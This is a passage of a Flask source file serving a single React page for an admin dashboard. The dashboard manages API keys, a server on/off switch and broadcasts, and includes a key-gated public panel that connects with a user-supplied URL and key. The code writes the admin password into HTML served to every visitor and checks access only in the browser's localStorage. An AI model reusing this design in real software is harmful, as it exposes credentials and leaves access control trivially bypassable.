                e("option", { value: "30" }, "30 Days"),
                e("option", { value: "90" }, "90 Days"),
                e("option", { value: "365" }, "1 Year"),
                e("option", { value: "never" }, "Never Expires")
              )
            )
          ),
          e("div", { className: "mb-3" },
            e("label", { className: "block text-xs font-semibold uppercase tracking-wider mb-2", style: { color: "#888" } }, "API Key (leave empty to auto-generate)"),
            e("div", { className: "flex gap-2" },
              e("input", { type: "text", value: apiKeyVal, onChange: ev => setApiKeyVal(ev.target.value), placeholder: "Auto-generate", className: "flex-1 px-4 py-3 rounded-xl outline-none text-sm font-mono", style: { background: "#111", border: "1px solid #222", color: "#fff" } }),
              e("button", { onClick: () => setApiKeyVal(genKey()), className: "px-4 rounded-xl text-xs font-semibold", style: { background: "#1a1a1a", border: "1px solid #2a2a2a", color: "#888" } }, "🎲 Gen")
            )
          ),
          e("button", { onClick: handleAddApi, className: "w-full py-3 rounded-xl red-gradient text-white font-bold text-sm" }, "Create API Key")
        ),
        e("div", { className: "p-5 rounded-2xl", style: { background: "#0d0d0d", border: "1px solid #1f1f1f" } },
          e("h3", { className: "text-sm font-bold mb-3" }, "All API Keys (" + apiKeys.length + ")"),
          apiKeys.length === 0 ? e("p", { className: "text-sm text-center py-6", style: { color: "#555" } }, "No API keys yet")
            : apiKeys.map(k => {
              const expired = k.expiresAt && Date.now() > k.expiresAt;
              const dLeft = k.expiresAt ? daysLeft(k.expiresAt) : null;
              return e("div", { key: k.id, className: "p-3 rounded-xl mb-2", style: { background: "#111", border: "1px solid " + (expired ? "rgba(127,29,29,0.4)" : "#222") } },
                e("div", { className: "flex items-start justify-between mb-2 gap-2 flex-wrap" },
                  e("div", { className: "flex-1 min-w-0" },
                    e("div", { className: "flex items-center gap-2 flex-wrap" },
                      e("span", { className: "text-sm font-bold" }, k.name),
                      expired && e("span", { className: "text-[10px] px-2 py-0.5 rounded-full", style: { background: "rgba(127,29,29,0.5)", color: "#f87171" } }, "EXPIRED"),
                      !expired && k.active && e("span", { className: "text-[10px] px-2 py-0.5 rounded-full", style: { background: "rgba(34,197,94,0.15)", color: "#4ade80" } }, "Active"),
                      !k.active && e("span", { className: "text-[10px] px-2 py-0.5 rounded-full", style: { background: "rgba(107,114,128,0.3)", color: "#888" } }, "Disabled")
                    ),
                    e("div", { className: "text-xs font-mono mt-1 break-all", style: { color: "#60a5fa" } }, "/v2/" + k.key),
                    e("div", { className: "text-[10px] mt-1", style: { color: "#666" } },
                      "Expires: " + (k.expiresAt ? fmtExpiry(k.expiresAt) : "Never") +
                      (dLeft !== null ? " · " + (dLeft > 0 ? dLeft + " days left" : "expired") : "")
                    )
                  ),
                  e("div", { className: "flex items-center gap-1" },
                    e("button", { onClick: () => { navigator.clipboard.writeText(window.location.origin + "/v2/" + k.key); showToast("URL copied!", "success"); }, className: "p-2 rounded-lg", style: { background: "rgba(23,37,84,0.6)", border: "1px solid rgba(30,64,175,0.4)", color: "#60a5fa" } }, e(Icon, { name: "copy", size: 14 })),
                    e("button", { onClick: () => { saveKeys(apiKeys.map(x => x.id === k.id ? { ...x, active: !x.active } : x)); showToast(k.active ? "Disabled" : "Enabled"); }, className: "p-2 rounded-lg", style: { background: "#1a1a1a", border: "1px solid #2a2a2a", color: "#888" } }, e(Icon, { name: "power", size: 14 })),
                    e("button", { onClick: () => confirm("Delete key " + k.name + "?") && saveKeys(apiKeys.filter(x => x.id !== k.id)), className: "p-2 rounded-lg", style: { background: "rgba(69,10,10,0.4)", border: "1px solid rgba(127,29,29,0.3)", color: "#f87171" } }, e(Icon, { name: "trash", size: 14 }))
                  )
                )
              );
            })
        )
      ),

      // CONTROL
      tab === "control" && e("div", { className: "animate-fade-up" },
        e("div", { className: "p-5 rounded-2xl mb-4", style: { background: "#0d0d0d", border: "1px solid #1f1f1f" } },
          e("h2", { className: "text-lg font-bold mb-4" }, "Panel Status"),
          e("div", { className: "flex items-center justify-between p-4 rounded-xl", style: { background: status.online ? "rgba(34,197,94,0.08)" : "rgba(127,29,29,0.15)", border: "1px solid " + (status.online ? "rgba(34,197,94,0.3)" : "rgba(127,29,29,0.3)") } },
            e("div", null,
              e("p", { className: "text-sm font-bold mb-1" }, "Server: ", e("span", { style: { color: status.online ? "#4ade80" : "#f87171" } }, status.online ? "ONLINE" : "OFFLINE")),
              e("p", { className: "text-xs", style: { color: "#666" } }, status.online ? "Public can access with valid key" : "Public blocked")
            ),
            e("button", { onClick: () => { saveStatus({ ...status, online: !status.online }); showToast("Status updated", "success"); }, className: "px-4 py-2 rounded-xl text-xs font-bold", style: { background: status.online ? "rgba(220,38,38,0.2)" : "rgba(34,197,94,0.2)", color: status.online ? "#f87171" : "#4ade80", border: "1px solid " + (status.online ? "rgba(220,38,38,0.4)" : "rgba(34,197,94,0.4)") } },
              e(Icon, { name: "power", size: 14 }), " Turn " + (status.online ? "OFF" : "ON"))
          )
        ),
        e("div", { className: "p-5 rounded-2xl", style: { background: "#0d0d0d", border: "1px solid #1f1f1f" } },
          e("h3", { className: "text-sm font-bold mb-3" }, "Broadcast Message"),
          e("textarea", { value: broadcast, onChange: ev => setBroadcast(ev.target.value), rows: 3, placeholder: "Message shown to all users…", className: "w-full px-4 py-3 rounded-xl outline-none text-sm mb-3", style: { background: "#111", border: "1px solid #222", color: "#fff" } }),
          e("div", { className: "flex gap-2" },
            e("button", { onClick: () => { saveStatus({ ...status, broadcast }); showToast("Broadcast sent!", "success"); }, className: "flex-1 py-2.5 rounded-xl red-gradient text-white font-semibold text-sm" }, "Send Broadcast"),
            e("button", { onClick: () => { setBroadcast(""); saveStatus({ ...status, broadcast: "" }); showToast("Cleared"); }, className: "px-4 py-2.5 rounded-xl text-sm", style: { background: "#1a1a1a", border: "1px solid #2a2a2a", color: "#888" } }, "Clear")
          )
        )
      )
    ),
    toast && e(Toast, { msg: toast.msg, type: toast.type, onClose: () => setToast(null) })
  );
}

function StatCard({ label, val, color = "#fff" }) {
  return e("div", { className: "p-4 rounded-xl", style: { background: "#0d0d0d", border: "1px solid #1f1f1f" } },
    e("p", { className: "text-[10px] uppercase tracking-widest font-semibold mb-1", style: { color: "#555" } }, label),
    e("p", { className: "text-2xl font-black", style: { color } }, val)
  );
}

// ---------- PUBLIC PANEL WRAPPER (checks API key) ----------
function PublicPanel() {
  const apiKey = getApiKeyFromPath();
  const result = validateApiKey(apiKey);
  const [session, setSession] = useState(null);
  const [status, setStatus] = useState(() => LS.get(K_PANELSTATUS, { online: true, broadcast: "" }));

  useEffect(() => {
    const iv = setInterval(() => setStatus(LS.get(K_PANELSTATUS, { online: true, broadcast: "" })), 5000);
    return () => clearInterval(iv);
  }, []);

  if (!result.valid) return e(AccessDeniedScreen, { reason: result.reason, keyObj: result.keyObj });
  if (!status.online) return e(AccessDeniedScreen, { reason: "offline" });

  if (session) {
    return e(Panel, { fbUrl: session.url, fbKey: session.key, accounts: session.accounts, onLogout: () => setSession(null) });
  }
  return e(LoginScreen, { onConnect: (u, k) => setSession({ url: u, key: k }), onConnectAll: (accs) => setSession({ url: accs[0].url, key: accs[0].key, accounts: accs }) });
}

// ---------- ADMIN WRAPPER ----------
function AdminApp() {
  const [authed, setAuthed] = useState(() => !!LS.get(K_ADMIN, null));
  if (!authed) return e(AdminLogin, { onSuccess: () => setAuthed(true) });
  return e(AdminDashboard, { onLogout: () => { LS.del(K_ADMIN); setAuthed(false); } });
}

// ---------- ROUTER ----------
function App() {
  const path = window.location.pathname;
  if (path.startsWith("/admin1")) return e(AdminApp);
  return e(PublicPanel);
}

ReactDOM.createRoot(document.getElementById("root")).render(e(App));
</script>
</body>
</html>"""

# Replace placeholders
PAGE_HTML = PAGE_HTML.replace("__ADMIN_PASSWORD__", ADMIN_PASSWORD)
PAGE_HTML = PAGE_HTML.replace("__CONTACT_USERNAME__", CONTACT_USERNAME)
PAGE_HTML = PAGE_HTML.replace("__TELEGRAM_CHANNEL__", TELEGRAM_CHANNEL)


# ============================================================
# ROUTES
# ============================================================
@app.route("/")
def root():
    return Response(PAGE_HTML, mimetype="text/html")

@app.route("/admin1")
@app.route("/admin1/")
def admin_page():
    return Response(PAGE_HTML, mimetype="text/html")

@app.route("/v2/<api_key>")
@app.route("/v2/<api_key>/")
def public_panel(api_key):
    return Response(PAGE_HTML, mimetype="text/html")

@app.route("/healthz")
def health():
    return {"status": "ok"}

@app.route("/<path:path>")
def catch_all(path):
    return Response(PAGE_HTML, mimetype="text/html")


# ============================================================
# MAIN
# ============================================================
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
